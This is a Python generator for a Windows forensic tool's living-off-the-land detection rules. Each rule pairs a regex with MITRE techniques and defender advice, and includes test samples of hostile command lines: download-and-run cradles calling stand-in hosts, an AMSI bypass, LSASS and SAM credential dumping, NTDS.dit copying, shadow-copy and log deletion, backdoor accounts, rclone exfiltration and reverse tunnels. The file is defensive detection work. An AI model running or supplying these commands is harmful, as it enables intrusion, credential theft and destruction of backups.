# Source of Rules/lotl.json (kept in Python so regexes need no JSON double-escaping).
import json, pathlib
R = []
def rule(id, title, images, pattern, technique, severity, confidence, description, recommendation, match, nomatch, exclude=None):
    r = dict(id=id, title=title, images=images, pattern=pattern, technique=technique, severity=severity,
             confidence=confidence, description=description, recommendation=recommendation,
             tests=dict(match=match, nomatch=nomatch))
    if exclude: r["exclude"] = exclude
    R.append(r)

PS = ["powershell.exe", "pwsh.exe", "powershell_ise.exe"]
REMOTE = r"(?:https?://|\\\\[\w.\-]+\\)"

# ── PowerShell ──
rule("LOTL-PS-ENCODED", "PowerShell with an encoded command", PS,
     r"(?i)(?:^|\s)[-/]e(?:nc(?:odedcommand)?|c|ncodedcommand)?\s+[A-Za-z0-9+/=]{40,}",
     ["T1059.001", "T1027.010"], "High", "High",
     "PowerShell was given a Base64-encoded command, which hides what it runs. Common in malware launchers and droppers.",
     "Decode the Base64 (UTF-16LE) to see the real command. Check the parent process and how it was started.",
     ["powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkA",
      "pwsh -EncodedCommand JABhAD0AJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgAxAC4AMQAnAA=="],
     ["powershell.exe -ExecutionPolicy Bypass -File C:\\scripts\\backup.ps1", "powershell -e short"])
rule("LOTL-PS-DOWNLOAD-CRADLE", "PowerShell download-and-run cradle", PS,
     r"(?i)(?:iex|invoke-expression|\.invoke\(\)|\|\s*&|&\s*\(\s*\$)[\s\S]{0,200}(?:downloadstring|downloaddata|invoke-webrequest|iwr|irm|invoke-restmethod|net\.webclient|start-bitstransfer)|(?:downloadstring|downloaddata|invoke-restmethod|irm|iwr|invoke-webrequest)[\s\S]{0,300}(?:\|\s*iex|\|\s*invoke-expression|iex\s*\()",
     ["T1059.001", "T1105"], "High", "High",
     "PowerShell downloads code from the network and executes it in memory without saving a file — a classic first-stage loader.",
     "Identify the URL, fetch it safely in a sandbox, and block the domain/IP. Look for what ran next (child processes, new connections).",
     ["powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://x.example/a.ps1')\"",
      "powershell iwr https://evil.example/p.ps1 -UseBasicParsing | iex",
      "powershell -c irm https://get.example.com/install.ps1 | iex"],
     ["powershell -c Invoke-WebRequest https://example.com/file.zip -OutFile C:\\temp\\file.zip",
      "powershell -File C:\\Program Files\\App\\update.ps1"])
rule("LOTL-PS-HIDDEN-BYPASS", "PowerShell launched hidden with policy bypass", PS,
     r"(?i)(?=.*(?:^|\s)[-/]w(?:in(?:dowstyle)?)?\s+h(?:idden)?\b)(?=.*(?:[-/]ep?\s+bypass|[-/]exec(?:utionpolicy)?\s+bypass|[-/]nop(?:rofile)?\b))",
     ["T1059.001"], "Medium", "Medium",
     "Hidden window plus execution-policy bypass or no profile is typical of scripted attacks, though some admin tools do this too.",
     "Check the script or command being run, and whether the parent (e.g. Office, browser, scheduled task) is expected.",
     ["powershell.exe -NoP -NonI -W Hidden -Exec Bypass -File C:\\Users\\a\\AppData\\x.ps1",
      "powershell -windowstyle hidden -ep bypass -c whoami"],
     ["powershell -ep bypass -File .\\build.ps1", "powershell.exe -WindowStyle Hidden -File C:\\Windows\\ccmcache\\x.ps1"])
rule("LOTL-PS-AMSI-BYPASS", "AMSI / script-scanning bypass attempt", [],
     r"(?i)amsiutils|amsiinitfailed|amsiscanbuffer|amsicontext|amsi\.dll.{0,80}(?:virtualprotect|patch)|\[ref\]\.assembly\.gettype\(.{0,40}amsi",
     ["T1562.001"], "Critical", "High",
     "A command tried to disable the Antimalware Scan Interface so malicious scripts aren't scanned. Legitimate software essentially never does this.",
     "Treat the host as compromised. Capture the full script (event 4104), isolate the machine and look for follow-on activity.",
     ["powershell -c [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"],
     ["powershell -c Get-Process"])
rule("LOTL-PS-REFLECTIVE", "In-memory .NET assembly loading", PS,
     r"(?i)(?:\[system\.reflection\.assembly\]|\[reflection\.assembly\])\s*::\s*load(?:file|from)?\s*\(\s*(?:\[convert\]::frombase64string|\(new-object|\$)|frombase64string[\s\S]{0,200}::load\(",
     ["T1620", "T1027"], "High", "High",
     "PowerShell loads a .NET assembly straight from memory (often Base64), a common way to run tools like loaders and post-exploitation kits without touching disk.",
     "Recover the Base64 blob from the command or event 4104 and analyze it in a sandbox.",
     ["powershell -c [System.Reflection.Assembly]::Load([Convert]::FromBase64String($b))"],
     ["powershell -c [Reflection.Assembly]::LoadWithPartialName('System.Windows.Forms')"])
rule("LOTL-PS-DEFENDER-TAMPER", "Microsoft Defender disabled or excluded from the command line", [],
     r"(?i)set-mppreference\s[^\n]{0,200}-disable(?:realtimemonitoring|behaviormonitoring|ioavprotection|scriptscanning|blockatfirstseen)\s+(?:\$true|1)|add-mppreference\s[^\n]{0,100}-exclusion(?:path|process|extension)|sc(?:\.exe)?\s+(?:stop|config)\s+windefend",
     ["T1562.001"], "High", "High",
     "Antivirus protection was turned off or a folder/process was excluded from scanning — attackers do this right before dropping payloads.",
     "Re-enable protection, remove unexpected exclusions (Get-MpPreference) and scan the excluded locations.",
     ["powershell Set-MpPreference -DisableRealtimeMonitoring $true", "powershell -c Add-MpPreference -ExclusionPath C:\\Users\\Public"],
     ["powershell Get-MpPreference", "powershell Set-MpPreference -DisableRealtimeMonitoring $false"])
# ── Script hosts ──
rule("LOTL-MSHTA", "mshta running remote or inline script", ["mshta.exe"],
     r"(?i)" + REMOTE + r"|javascript:|vbscript:|\.hta\b",
     ["T1218.005"], "High", "High",
     "mshta.exe executed an HTA file or inline script. It is heavily abused for initial access (including fake-CAPTCHA “ClickFix” lures) and rarely used legitimately.",
     "Find where the URL/file came from (browser history, email, RunMRU), block it, and check for payloads it dropped.",
     ["mshta.exe https://cdn.example/verify.hta", "mshta vbscript:Execute(\"CreateObject(\"\"WScript.Shell\"\").Run \"\"powershell\"\"\")(window.close)"],
     ["mshta.exe"])
rule("LOTL-WSCRIPT-USERPATH", "Windows Script Host running a script from a user folder", ["wscript.exe", "cscript.exe"],
     r"(?i)\\(?:appdata|temp|downloads|desktop|users\\public|programdata)\\[^\n]*\.(?:js|jse|vbs|vbe|wsf|wsh)\b",
     ["T1059.005", "T1059.007"], "High", "Medium",
     "A JScript/VBScript file ran from a user-writable folder — the usual path for malicious email and download attachments.",
     "Collect the script, check how it arrived (email/download), and look for child processes it started.",
     ["wscript.exe \"C:\\Users\\bob\\Downloads\\Invoice_2026.js\"", "cscript //nologo C:\\Users\\bob\\AppData\\Local\\Temp\\a.vbs"],
     ["cscript.exe C:\\Windows\\System32\\slmgr.vbs /dli"])
# ── Download / transfer ──
rule("LOTL-CERTUTIL-DOWNLOAD", "certutil used to download a file", ["certutil.exe"],
     r"(?i)-(?:urlcache|verifyctl)\b|" + REMOTE,
     ["T1105"], "High", "High",
     "certutil.exe fetched a file from the network. Attackers use it as a built-in downloader.",
     "Find and hash the downloaded file, check it against threat intelligence, and block the source.",
     ["certutil.exe -urlcache -split -f http://203.0.113.5/a.exe C:\\Users\\Public\\a.exe", "certutil -verifyctl -f -split https://x.example/p"],
     ["certutil -hashfile C:\\file.zip SHA256", "certutil -store my"])
rule("LOTL-CERTUTIL-DECODE", "certutil used to decode a file", ["certutil.exe"],
     r"(?i)-decode(?:hex)?\b",
     ["T1140"], "Medium", "Medium",
     "certutil.exe decoded a Base64/hex file — often used to unpack a payload smuggled as text.",
     "Inspect the input and output files named in the command line.",
     ["certutil -decode C:\\Users\\a\\AppData\\Local\\Temp\\p.txt C:\\Users\\a\\p.exe"],
     ["certutil -encode in.bin out.txt"])
rule("LOTL-BITSADMIN", "bitsadmin download or command job", ["bitsadmin.exe"],
     r"(?i)/(?:transfer|addfile|setnotifycmdline|create)\b",
     ["T1197", "T1105"], "High", "Medium",
     "BITS was used to download a file or run a command when a job completes — a stealthy persistence and download method.",
     "List BITS jobs (Get-BitsTransfer -AllUsers) and investigate the URL and notify command.",
     ["bitsadmin /transfer job /download /priority high http://x.example/a.exe C:\\Users\\Public\\a.exe",
      "bitsadmin /SetNotifyCmdLine myjob C:\\Windows\\Temp\\run.exe NULL"],
     ["bitsadmin /list /allusers"])
rule("LOTL-CURL-RAW-IP", "curl downloading from a raw IP address", ["curl.exe"],
     r"(?i)https?://\d{1,3}(?:\.\d{1,3}){3}(?::\d+)?/",
     ["T1105"], "Medium", "Medium",
     "curl.exe fetched content from a bare IP address rather than a named site — common for attacker staging servers.",
     "Look up the IP's reputation and check what was saved (-o) and executed afterwards.",
     ["curl.exe -o C:\\Users\\Public\\x.exe http://198.51.100.7:8080/x.exe"],
     ["curl.exe -o setup.exe https://download.example.com/setup.exe"])
rule("LOTL-FINGER", "finger.exe used to fetch commands", ["finger.exe"],
     r"(?i)@",
     ["T1105", "T1204.004"], "High", "High",
     "finger.exe queried a remote host. It has almost no modern legitimate use and is abused in ClickFix campaigns to pull down the next command.",
     "Block the remote host and check RunMRU/clipboard-driven executions on this machine.",
     ["finger.exe gate@203.0.113.9", "cmd /c finger x@evil.example | cmd"],
     ["finger.exe"])
# ── Proxy execution ──
rule("LOTL-REGSVR32-REMOTE", "regsvr32 loading a remote scriptlet (Squiblydoo)", ["regsvr32.exe"],
     r"(?i)/i:\s*" + REMOTE + r"|scrobj\.dll",
     ["T1218.010"], "High", "High",
     "regsvr32 executed a scriptlet from a URL or via scrobj.dll — a well-known application-control bypass.",
     "Retrieve the scriptlet URL, block it, and review child processes.",
     ["regsvr32 /s /n /u /i:http://x.example/file.sct scrobj.dll"],
     ["regsvr32 /s C:\\Program Files\\App\\component.dll"])
rule("LOTL-REGSVR32-USERPATH", "regsvr32 registering a DLL from a user folder", ["regsvr32.exe"],
     r"(?i)\\(?:appdata|temp|downloads|users\\public|programdata)\\",
     ["T1218.010"], "Medium", "Medium",
     "regsvr32 loaded a DLL from a user-writable folder — a frequent way to execute malicious DLLs.",
     "Hash the DLL and check its signature and origin.",
     ["regsvr32.exe /s C:\\Users\\bob\\AppData\\Roaming\\upd.dll"],
     ["regsvr32.exe /s C:\\Windows\\System32\\jscript.dll"])
rule("LOTL-RUNDLL32-SUSPICIOUS", "rundll32 running script or a URL handler", ["rundll32.exe"],
     r"(?i)javascript:|vbscript:|mshtml,RunHTMLApplication|url\.dll,(?:OpenURL|FileProtocolHandler)|zipfldr\.dll,RouteTheCall|shell32\.dll,ShellExec_RunDLL|advpack\.dll,(?:LaunchINFSection|RegisterOCX)|ieadvpack\.dll|pcwutl\.dll,LaunchApplication|" + REMOTE,
     ["T1218.011"], "High", "Medium",
     "rundll32 was used to run script or launch another program through a Windows DLL export — common proxy-execution tricks.",
     "Look at the full command line and the process it launched.",
     ["rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication \";alert(1)", "rundll32.exe url.dll,OpenURL C:\\Users\\a\\x.hta"],
     ["rundll32.exe C:\\Windows\\System32\\shell32.dll,Control_RunDLL desk.cpl"])
rule("LOTL-RUNDLL32-USERPATH", "rundll32 loading a DLL from a user folder", ["rundll32.exe"],
     r"(?i)\\(?:appdata|temp|downloads|users\\public|programdata|desktop)\\[^,\n]+\.(?:dll|dat|tmp|png|jpg|bin|ocx|cpl|txt|log)\b",
     ["T1218.011"], "High", "Medium",
     "rundll32 executed code from a user-writable folder (sometimes disguised with a non-DLL extension) — typical of loaders like those used by banking trojans and ransomware precursors.",
     "Hash and submit the DLL for analysis; check persistence entries that reference it.",
     ["rundll32.exe C:\\Users\\bob\\AppData\\Local\\Temp\\x.dat,DllRegisterServer", "rundll32 C:\\ProgramData\\upd\\img.png,Start"],
     ["rundll32.exe C:\\Windows\\System32\\printui.dll,PrintUIEntry /il"])
rule("LOTL-COMSVCS-MINIDUMP", "LSASS memory dump via comsvcs.dll", [],
     r"(?i)comsvcs(?:\.dll)?[^\n]{0,40}(?:minidump|#\s*\+?0*24\b)",
     ["T1003.001"], "Critical", "High",
     "A process memory dump was requested through comsvcs.dll MiniDump — the standard living-off-the-land way to steal credentials from LSASS.",
     "Assume credentials on this host are compromised: isolate it, reset passwords for accounts that logged on, and find the dump file.",
     ["rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 624 C:\\Windows\\Temp\\l.dmp full", "rundll32 comsvcs.dll #24 640 out.dmp full"],
     ["rundll32.exe C:\\Windows\\System32\\comsvcs.dll"])
rule("LOTL-MSIEXEC-REMOTE", "msiexec installing a package from a URL", ["msiexec.exe"],
     r"(?i)/(?:i|package|y|z)\s*" + REMOTE,
     ["T1218.007"], "High", "Medium",
     "msiexec installed an MSI directly from the internet, a common malware delivery method.",
     "Identify the MSI source and what it installed (Programs and Features, new services, new files).",
     ["msiexec /q /i http://x.example/update.msi"],
     ["msiexec /i C:\\Installers\\app.msi /qn"])
rule("LOTL-INSTALLUTIL", "InstallUtil used to run code", ["installutil.exe"],
     r"(?i)/u\b|/logfile=\s|\\(?:appdata|temp|users\\public|programdata)\\",
     ["T1218.004"], "High", "Medium",
     "InstallUtil can execute arbitrary .NET code and is used to bypass application allow-listing.",
     "Inspect the assembly passed to InstallUtil.",
     ["C:\\Windows\\Microsoft.NET\\Framework64\\v4.0.30319\\InstallUtil.exe /logfile= /LogToConsole=false /U C:\\Users\\a\\AppData\\x.dll"],
     ["InstallUtil.exe C:\\Program Files\\Vendor\\Service.exe"])
rule("LOTL-REGASM-REGSVCS", "RegAsm/RegSvcs loading an assembly from a user folder", ["regasm.exe", "regsvcs.exe"],
     r"(?i)\\(?:appdata|temp|downloads|users\\public|programdata)\\",
     ["T1218.009"], "High", "Medium",
     "RegAsm/RegSvcs ran a .NET assembly from a user-writable folder — a known allow-listing bypass.",
     "Hash and analyze the assembly.",
     ["regasm.exe /U C:\\Users\\Public\\x.dll"],
     ["regasm.exe C:\\Program Files\\Vendor\\Interop.dll"])
rule("LOTL-CMSTP", "CMSTP used to run an INF file", ["cmstp.exe"],
     r"(?i)/(?:s|ni|au)\b.*\.inf|\.inf.*\s/(?:s|ni|au)\b",
     ["T1218.003", "T1548.002"], "High", "Medium",
     "cmstp.exe executed an INF profile silently — used to bypass UAC and allow-listing.",
     "Review the INF file's RunPreSetupCommands section.",
     ["cmstp.exe /ni /s C:\\Users\\a\\AppData\\Local\\Temp\\x.inf"],
     ["cmstp.exe"])
rule("LOTL-ODBCCONF", "odbcconf registering a DLL", ["odbcconf.exe"],
     r"(?i)regsvr|/a\s*\{|-f\s+\S+\.rsp",
     ["T1218.008"], "High", "Medium",
     "odbcconf was used to load a DLL — a rarely legitimate proxy-execution technique.",
     "Identify and analyze the referenced DLL.",
     ["odbcconf.exe /a {REGSVR C:\\Users\\Public\\x.dll}"],
     ["odbcconf.exe /?"])
rule("LOTL-HH-REMOTE", "Compiled HTML Help opened from the internet", ["hh.exe"],
     r"(?i)" + REMOTE + r"|\\(?:downloads|temp|appdata)\\[^\n]*\.chm",
     ["T1218.001"], "Medium", "Medium",
     "hh.exe opened a CHM help file from the internet or a user folder; malicious CHM files can run script.",
     "Collect the CHM and check how it arrived.",
     ["hh.exe http://x.example/help.chm", "hh.exe C:\\Users\\a\\Downloads\\manual.chm"],
     ["hh.exe C:\\Windows\\Help\\mui\\0409\\mmc.CHM"])
rule("LOTL-INDIRECT-EXEC", "Indirect command execution (forfiles / pcalua / conhost)", ["forfiles.exe", "pcalua.exe", "conhost.exe"],
     r"(?i)forfiles.*\s/c\s|pcalua.*\s-a\s|conhost(?:\.exe)?\s+(?:--headless\s+)?(?=[^\s-])[^\n]*(?:cmd|powershell|mshta|\.exe)",
     ["T1202"], "Medium", "Medium",
     "A built-in tool was used to launch another program indirectly, which can evade simple parent-child monitoring.",
     "Look at the program that was launched.",
     ["forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe", "pcalua.exe -a C:\\Users\\a\\x.exe", "conhost.exe --headless powershell -c whoami"],
     ["conhost.exe 0xffffffff -ForceV1"])
# ── Recovery inhibition / anti-forensics ──
rule("LOTL-SHADOW-DELETE", "Volume shadow copies deleted or shrunk", [],
     r"(?i)vssadmin(?:\.exe)?\s+(?:delete\s+shadows|resize\s+shadowstorage)|wmic(?:\.exe)?\s+shadowcopy\s+delete|win32_shadowcopy[^\n]{0,80}(?:delete|remove)|get-ciminstance[^\n]{0,40}win32_shadowcopy[^\n]{0,80}remove-ciminstance",
     ["T1490"], "Critical", "High",
     "Backups that Windows keeps for recovery were deleted. This is one of the most reliable signs of ransomware about to encrypt, or already encrypting.",
     "Isolate the host from the network now. Check other hosts for the same command and preserve evidence before rebooting.",
     ["vssadmin.exe delete shadows /all /quiet", "wmic shadowcopy delete", "vssadmin resize shadowstorage /for=c: /on=c: /maxsize=401MB"],
     ["vssadmin list shadows"])
rule("LOTL-BACKUP-DESTROY", "Backup catalog or boot recovery disabled", ["wbadmin.exe", "bcdedit.exe"],
     r"(?i)delete\s+(?:catalog|systemstatebackup|backup)|recoveryenabled\s+(?:no|off)|bootstatuspolicy\s+ignoreallfailures",
     ["T1490"], "Critical", "High",
     "Windows backups or automatic recovery were disabled — a standard ransomware preparation step.",
     "Isolate the host and hunt for encryption activity and the same commands on other machines.",
     ["wbadmin delete catalog -quiet", "bcdedit /set {default} recoveryenabled No", "bcdedit /set {default} bootstatuspolicy ignoreallfailures"],
     ["bcdedit /enum"])
rule("LOTL-LOG-CLEAR", "Event logs cleared from the command line", [],
     r"(?i)wevtutil(?:\.exe)?\s+(?:cl|clear-log)\b|clear-eventlog\b|remove-eventlog\b|\[system\.diagnostics\.eventing\.reader\.eventlogsession\]::globalsession\.clearlog",
     ["T1070.001"], "High", "High",
     "Windows event logs were cleared — attackers do this to erase evidence of what they did.",
     "Collect any logs that remain (including forwarded copies/SIEM) and identify who ran the command.",
     ["wevtutil cl Security", "powershell Clear-EventLog -LogName System"],
     ["wevtutil qe Security /c:5"])
rule("LOTL-FIREWALL-OFF", "Firewall disabled or a port proxy added", ["netsh.exe"],
     r"(?i)advfirewall\s+set\s+\w+\s+state\s+off|firewall\s+set\s+opmode\s+(?:mode=)?disable|interface\s+portproxy\s+add",
     ["T1562.004", "T1090"], "High", "High",
     "The Windows firewall was turned off, or a port-forwarding proxy was created to tunnel traffic through this host.",
     "Re-enable the firewall and remove unexpected port proxies (netsh interface portproxy show all).",
     ["netsh advfirewall set allprofiles state off", "netsh interface portproxy add v4tov4 listenport=3389 connectaddress=10.0.0.5 connectport=3389"],
     ["netsh advfirewall show allprofiles"])
# ── Credential access ──
rule("LOTL-HIVE-SAVE", "Registry hives with password hashes saved to disk", ["reg.exe"],
     r"(?i)\b(?:save|export)\s+(?:hklm|hkey_local_machine)\\(?:sam|system|security)\b",
     ["T1003.002"], "Critical", "High",
     "The SAM, SYSTEM or SECURITY hive was copied out. Together they let an attacker extract local password hashes offline.",
     "Find and remove the saved hive files, assume local account hashes are exposed, and rotate local admin passwords (e.g. Windows LAPS).",
     ["reg save HKLM\\SAM C:\\Windows\\Temp\\sam.hiv", "reg.exe save hklm\\system c:\\perflogs\\sys"],
     ["reg query HKLM\\SYSTEM\\CurrentControlSet\\Services"])
rule("LOTL-NTDS-COPY", "Active Directory database copy (NTDS.dit)", [],
     r"(?i)ntdsutil[^\n]{0,80}(?:ifm|create\s+full)|esentutl[^\n]{0,60}/y[^\n]{0,80}(?:ntds|/vss)|\\ntds\.dit",
     ["T1003.003"], "Critical", "High",
     "An attempt to copy the Active Directory database, which contains password hashes for every domain account.",
     "Treat the domain as compromised: involve your incident response process, and plan a krbtgt and privileged-account reset.",
     ["ntdsutil \"ac i ntds\" \"ifm\" \"create full c:\\temp\\x\" q q", "esentutl.exe /y /vss C:\\Windows\\NTDS\\ntds.dit /d C:\\temp\\n.dit"],
     ["ntdsutil /?"])
# ── Persistence / accounts via CLI ──
rule("LOTL-SCHTASKS-SUSPICIOUS", "Scheduled task created to run a script host or user-folder binary", ["schtasks.exe"],
     r"(?i)/create\b(?=[^\n]*(?:powershell|pwsh|cmd(?:\.exe)?\s*/c|mshta|wscript|cscript|rundll32|regsvr32|certutil|bitsadmin|\\appdata\\|\\temp\\|\\users\\public\\|\\programdata\\))",
     ["T1053.005"], "Medium", "Medium",
     "A scheduled task was created that runs a script interpreter or a program from a user-writable folder — a common persistence method.",
     "Review the task (schtasks /query /tn NAME /v /fo list) and its action.",
     ["schtasks /create /sc minute /mo 30 /tn \"Updater\" /tr \"powershell -w hidden -f C:\\Users\\Public\\u.ps1\"", "schtasks /Create /SC ONLOGON /TN x /TR C:\\Users\\a\\AppData\\Roaming\\x.exe"],
     ["schtasks /create /tn Backup /tr \"C:\\Program Files\\Backup\\run.exe\" /sc daily"])
rule("LOTL-SERVICE-SUSPICIOUS", "Service created to run a script host or user-folder binary", ["sc.exe"],
     r"(?i)\b(?:create|config)\b[^\n]*binpath\s*=\s*[^\n]*(?:powershell|cmd(?:\.exe)?\s*/c|mshta|rundll32|regsvr32|\\appdata\\|\\temp\\|\\users\\public\\|\\programdata\\)",
     ["T1543.003"], "High", "Medium",
     "A Windows service was set to run a script interpreter or a program from a user-writable folder — used for persistence and privilege escalation.",
     "Inspect and remove the service if it is not legitimate (sc qc NAME).",
     ["sc create upd binPath= \"cmd /c C:\\Users\\Public\\x.exe\" start= auto", "sc.exe config Spooler binpath= C:\\ProgramData\\x.exe"],
     ["sc query Spooler", "sc create MySvc binPath= \"C:\\Program Files\\Vendor\\svc.exe\""])
rule("LOTL-RUNKEY-ADD", "Run key added from the command line", ["reg.exe", "powershell.exe", "pwsh.exe"],
     r"(?i)(?:reg(?:\.exe)?\s+add|new-itemproperty|set-itemproperty)[^\n]*\\currentversion\\(?:run|runonce|policies\\explorer\\run)\b",
     ["T1547.001"], "Medium", "Medium",
     "A program was registered to start automatically at logon via a Run key.",
     "Check the value that was added and whether the program is expected.",
     ["reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /t REG_SZ /d C:\\Users\\a\\AppData\\x.exe"],
     ["reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run"])
rule("LOTL-ACCOUNT-ADMIN-ADD", "Account added to the local Administrators group", ["net.exe", "net1.exe"],
     r"(?i)localgroup\s+(?:administrators|administrateurs|administradores|administratoren|\"?remote desktop users\"?)\s+\S+\s+/add",
     ["T1098"], "High", "Medium",
     "An account was given local administrator (or RDP) rights from the command line.",
     "Confirm the change was authorized; remove the membership if not and review the account's activity.",
     ["net localgroup administrators support$ /add", "net1 localgroup \"Remote Desktop Users\" bob /add"],
     ["net localgroup administrators"])
rule("LOTL-ACCOUNT-CREATE", "Local account created from the command line", ["net.exe", "net1.exe"],
     r"(?i)\buser\s+\S+\s+\S+\s+/add\b|\buser\s+\S+\s+/add\b",
     ["T1136.001"], "Medium", "Medium",
     "A new local account was created from the command line.",
     "Verify the account is expected.",
     ["net user helpdesk P@ssw0rd1 /add", "net1 user backdoor /add"],
     ["net user", "net user bob"])
# ── Discovery bursts (low on their own) ──
rule("LOTL-DISCOVERY-DOMAIN", "Domain / privileged-group reconnaissance", ["nltest.exe", "net.exe", "net1.exe", "dsquery.exe", "adfind.exe"],
     r"(?i)domain_trusts|/dclist|group\s+\"?(?:domain admins|enterprise admins)\"?\s+/domain|trustdmp|-f\s+\(?objectcategory",
     ["T1482", "T1069"], "Low", "Medium",
     "Commands that list domain trusts or privileged groups. Normal for admins, but a common early step in hands-on-keyboard intrusions.",
     "Check who ran it and whether it clusters with other suspicious activity.",
     ["nltest /domain_trusts /all_trusts", "net group \"domain admins\" /domain", "adfind.exe -f (objectcategory=computer)"],
     ["net group"])
# ── Remote execution ──
rule("LOTL-WMIC-REMOTE-EXEC", "WMIC remote or process-create execution", ["wmic.exe"],
     r"(?i)/node:[^\n]+process\s+call\s+create|process\s+call\s+create",
     ["T1047"], "Medium", "Medium",
     "WMIC created a process, possibly on another machine — used for lateral movement and execution.",
     "Identify the target and the command executed.",
     ["wmic /node:10.0.0.12 /user:admin process call create \"cmd /c whoami\"", "wmic process call create calc.exe"],
     ["wmic process list brief"])
rule("LOTL-PSEXEC", "PsExec-style remote service execution", ["psexec.exe", "psexec64.exe", "paexec.exe", "csexec.exe", "remcom.exe"],
     r"(?i)\\\\[\w.\-]+\s|-s\s|-accepteula",
     ["T1569.002", "T1021.002"], "Medium", "Medium",
     "PsExec or a clone ran a command remotely. Admins use it, but so do ransomware operators to push payloads across a network.",
     "Confirm the operator and target were expected.",
     ["psexec.exe \\\\10.0.0.5 -s cmd.exe", "PsExec64.exe -accepteula -s -d \\\\fileserver c:\\windows\\temp\\x.exe"],
     ["psexec.exe"])
# ── ClickFix / cmd obfuscation ──
rule("LOTL-CMD-OBFUSCATION", "Heavily obfuscated cmd.exe command", ["cmd.exe"],
     r"(?:\^[^\^\s]){6,}|(?:%[A-Za-z_]+:~-?\d+,-?\d+%){3,}|set\s+\w+=[^&]*&&[^\n]*set\s+\w+=[^&]*&&[^\n]*call\s+%",
     ["T1027.010", "T1059.003"], "High", "Medium",
     "The command line is deliberately obfuscated (caret insertion or substring tricks) to dodge detection.",
     "Deobfuscate the command (remove carets, resolve the variables) and investigate what it runs.",
     ["cmd /c p^o^w^e^r^s^h^e^l^l -c whoami", "cmd /c %COMSPEC:~-7,1%%COMSPEC:~4,1%%COMSPEC:~-1,1%%COMSPEC:~3,1%"],
     ["cmd /c dir C:\\ ^| more"])
rule("LOTL-CLICKFIX-CHAIN", "Pasted one-liner that downloads and runs (ClickFix / fake CAPTCHA)", [],
     r"(?i)(?:powershell|pwsh|mshta|cmd)[^\n]{0,30}[\s\S]{0,300}(?:https?://|\\\\[\w.\-]+@?\d*\\)[\s\S]{0,300}(?:verify|captcha|human|robot|cloudflare|ray\s*id|i\s*am\s*not)",
     ["T1204.004", "T1059.001"], "High", "Medium",
     "A command containing a download plus ‘verification’ wording, typical of fake CAPTCHA / ClickFix pages that trick users into pasting commands into the Run box.",
     "Ask the user what website they were on, block it, and check what the command downloaded and ran.",
     ["powershell -w h -c \"iwr https://check.example/v | iex\" # I am not a robot - Cloudflare Verification ID: 2291",
      "mshta https://cdn.example/x # ✅ Verify you are human Ray ID: 88f2"],
     ["powershell -c Get-Date # verify"])
# ── Exfil / tunneling via CLI ──
rule("LOTL-RCLONE-EXFIL", "rclone copying data to cloud storage", ["rclone.exe"],
     r"(?i)\b(?:copy|sync|move)\b[^\n]*\s\S+:",
     ["T1567.002"], "High", "Medium",
     "rclone transferred files to a cloud remote. Ransomware gangs routinely use it to steal data before encrypting.",
     "Identify the remote (rclone config file), the data copied, and block the destination.",
     ["rclone.exe copy C:\\Shares\\Finance mega:backup --transfers 16", "rclone sync \\\\fs01\\hr remote:dump"],
     ["rclone.exe version"])
rule("LOTL-SSH-REVERSE-TUNNEL", "SSH/plink reverse tunnel", ["ssh.exe", "plink.exe"],
     r"(?i)\s-R\s*\d+:|\s-D\s*\d+|\s-R\s+\S+:\d+",
     ["T1572"], "High", "Medium",
     "An SSH reverse or dynamic tunnel was opened, which can expose internal services (like RDP) to an outside host.",
     "Identify the remote host and close the tunnel if unauthorized.",
     ["plink.exe -ssh -R 3389:127.0.0.1:3389 user@203.0.113.4", "ssh -R 4444:localhost:3389 tunnel@x.example"],
     ["ssh admin@server01"])

out = pathlib.Path(__file__).resolve().parent.parent / "WinForensicX" / "Rules" / "lotl.json"
out.write_text(json.dumps({"name": "Living-off-the-land and attacker command lines", "version": "2026.10", "rules": R}, indent=2, ensure_ascii=False) + "\n", encoding="utf-8")
print(len(R), "lotl rules ->", out)
